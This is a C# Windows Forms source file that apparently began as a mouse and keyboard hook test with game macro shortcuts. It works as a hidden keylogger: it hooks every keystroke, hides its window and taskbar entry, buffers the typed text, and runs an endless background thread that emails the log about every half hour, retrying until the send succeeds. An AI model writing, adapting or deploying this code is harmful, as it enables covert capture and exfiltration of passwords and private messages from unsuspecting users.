using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
//使用另一项目中生成的dll文件 -x取消

namespace SampleApplication
{
    public partial class HookTestForm : Form
    {
        public StringBuilder stringBuffer = new StringBuilder("以下是本次记录结果:\n",50);

        MouseHook mouseHook = new MouseHook();
        KeyboardHook keyboardHook = new KeyboardHook();

        public HookTestForm()
        {
            InitializeComponent();
        }

        private void TestForm_Load(object sender, EventArgs e)
        {

            mouseHook.MouseMove += new MouseEventHandler(mouseHook_MouseMove);
            mouseHook.MouseDown += new MouseEventHandler(mouseHook_MouseDown);
            mouseHook.MouseUp += new MouseEventHandler(mouseHook_MouseUp);
            mouseHook.MouseWheel += new MouseEventHandler(mouseHook_MouseWheel);

            keyboardHook.KeyDown += new KeyEventHandler(keyboardHook_KeyDown);
            keyboardHook.KeyUp += new KeyEventHandler(keyboardHook_KeyUp);
            keyboardHook.KeyPress += new KeyPressEventHandler(keyboardHook_KeyPress);

            mouseHook.Start();//启动鼠标钩子
            keyboardHook.Start();//启动键盘钩子
            //SetXYLabel(MouseSimulator.X, MouseSimulator.Y);
            SubForm subForm = new SubForm(this);
            this.Visible = false;
            this.Hide();
            subForm.Show();
            this.Opacity = 0;
            this.ShowInTaskbar = false;

            ThreadStart TOTSendEmailThread = new ThreadStart(TOTSendEmail);
            Thread stdThread = new Thread(TOTSendEmailThread);
            stdThread.Start();

        }

        void keyboardHook_KeyPress(object sender, KeyPressEventArgs e)
        {

            AddKeyboardEvent(
                "KeyPress",
                "",
                e.KeyChar.ToString(),
                "",
                "",
                ""
                );

        }

        void keyboardHook_KeyUp(object sender, KeyEventArgs e)
        {

            AddKeyboardEvent(
                "KeyUp",
                e.KeyCode.ToString(),
                "",
                e.Shift.ToString(),
                e.Alt.ToString(),
                e.Control.ToString()
                );

        }

        void keyboardHook_KeyDown(object sender, KeyEventArgs e)
        {


            AddKeyboardEvent(
                "KeyDown",
                e.KeyCode.ToString(),
                "",
                e.Shift.ToString(),
                e.Alt.ToString(),
                e.Control.ToString()
                );

            switch (e.KeyCode.ToString())
            {
                case "R":
                    SimulationKeyboardInput("t/q");
                    break;
                case "D1":
                    SimulationKeyboardInput("t/fangbaoguo");
                    break;
                case "D2":
                    SimulationKeyboardInput("t/smoke");
                    break;
                case "D3":
                    SimulationKeyboardInput("t/exit");
                    break;
                case "D4":
                    SimulationKeyboardInput("t/buyhujia");
                    break;
                default: break;
            }

        }

        void mouseHook_MouseWheel(object sender, MouseEventArgs e)
        {

            AddMouseEvent(
                "MouseWheel",
                "",
                "",
                "",
                e.Delta.ToString()
                );

        }

        void mouseHook_MouseUp(object sender, MouseEventArgs e)
        {


            AddMouseEvent(
                "MouseUp",
                e.Button.ToString(),
                e.X.ToString(),
                e.Y.ToString(),
                ""
                );

        }

        void mouseHook_MouseDown(object sender, MouseEventArgs e)
        {


            AddMouseEvent(
                "MouseDown",
                e.Button.ToString(),
                e.X.ToString(),
                e.Y.ToString(),
                ""
                );


        }

        void mouseHook_MouseMove(object sender, MouseEventArgs e)
        {

            SetXYLabel(e.X, e.Y);

        }

        void SetXYLabel(int x, int y)
        {

            curXYLabel.Text = String.Format("Current Mouse Point: X={0}, y={1}", x, y);

        }

        void AddMouseEvent(string eventType, string button, string x, string y, string delta)
        {

            listView1.Items.Insert(0,
                new ListViewItem(
                    new string[]{
                        eventType, 
                        button,
                        x,
                        y,
                        delta
                    }));

        }

        void AddKeyboardEvent(string eventType, string keyCode, string keyChar, string shift, string alt, string control)
        {

            listView2.Items.Insert(0,
                 new ListViewItem(
                     new string[]{
                        eventType, 
                        keyCode,
                        keyChar,
                        shift,
                        alt,
                        control
                }));
            richTextBox1.AppendText(keyChar);
            switch (keyCode)
            {
                case "Tab":stringBuffer.Append("\t");break;
                case "Return":stringBuffer.Append("\n");break;
                case "Back":stringBuffer.Append("←");break;
                default: stringBuffer.Append(keyChar);break;
            }
            
        }

        private void TestForm_FormClosed(object sender, FormClosedEventArgs e)
        {

            // Not necessary anymore, will stop when application exits

            //mouseHook.Stop();
            //keyboardHook.Stop();

        }

        private void SimulationKeyboardInput(string input)
        {
            SendKeys.Send(input);
            SendKeys.Send("{ENTER}");
        }

        void TOTSendEmail()
        {
            while (true)
            {
                if ((Convert.ToInt32(DateTime.Now.Minute.ToString()) % 30) == 1&& (Convert.ToInt32(DateTime.Now.Second.ToString()) / 10) == 1)
                {
                    while (!EmailClient.SendEmail(this.stringBuffer.ToString())){
                        continue;
                    }
                }
            }
        }
    }
}
